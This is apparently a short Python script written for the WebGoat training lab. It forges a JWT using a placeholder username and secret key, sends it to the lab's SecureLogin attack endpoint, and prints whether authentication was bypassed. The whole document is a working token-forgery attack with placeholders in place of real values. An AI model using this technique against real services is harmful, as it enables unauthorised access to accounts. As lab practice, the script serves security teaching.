import jwt
import requests

# Example of a JWT tampering script
token = jwt.encode({"username": "__USERNAME__"}, "__SECRET_KEY__", algorithm="HS256")
headers = {"Authorization": f"Bearer {token}"}

response = requests.get("http://__HOST_IP__:8080/WebGoat/SecureLogin/attack", headers=headers)
if response.status_code == 200:
    print("[+] Authentication bypassed!")
else:
    print(f"[-] Failed to bypass authentication. Status code: {response.status_code}")

